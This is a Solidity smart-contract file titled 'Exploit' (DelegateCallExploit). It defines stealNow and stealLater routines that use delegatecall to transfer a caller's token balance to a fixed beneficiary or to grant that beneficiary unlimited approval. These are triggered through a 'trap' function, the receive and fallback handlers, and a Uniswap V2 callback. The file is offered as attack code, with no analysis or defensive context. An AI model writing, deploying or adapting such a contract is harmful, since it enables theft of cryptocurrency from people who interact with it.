// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.0;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

/**
 * @title Exploit
 */
contract DelegateCallExploit {
    address asset;
    address beneficiary;
    string public state;

    constructor(address _asset, address _beneficiary) {
        asset = _asset;
        beneficiary = _beneficiary;
        state = "Default";
    }

//    function transferProxy(address beneficiary) external returns (uint256) {
//        (bool success, bytes data) = asset.call(abi.encodeWithSignature("balanceOf(address)", beneficiary));
//        require(success, "transfer");
//        return abi.decode(data, (uint256));
//    }

    function stealNow() internal {
        uint balance = IERC20(asset).balanceOf(msg.sender);
        state = "stealNow";
        (bool success,) = asset.delegatecall(abi.encodeWithSignature("transfer(address,uint256)", beneficiary, balance));
        require(success, "transfer");
    }

    function stealLater() internal {
        (bool success,) = asset.delegatecall(abi.encodeWithSignature("approve(address,uint256)", beneficiary, (uint256)(int256(-1))));
        require(success, "approve");
    }

    function getState() external view returns (string memory) {
        return state;
    }

    function trap() external {
        state = "trap";
        stealNow();
    }

    receive() payable external {
        state = "receive";
        if (msg.value == 0) {
            stealNow();
        }
    }

    fallback() payable external {
        state = "fallback";
        if (msg.value == 0) {
            stealNow();
        }
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        stealLater();
    }
}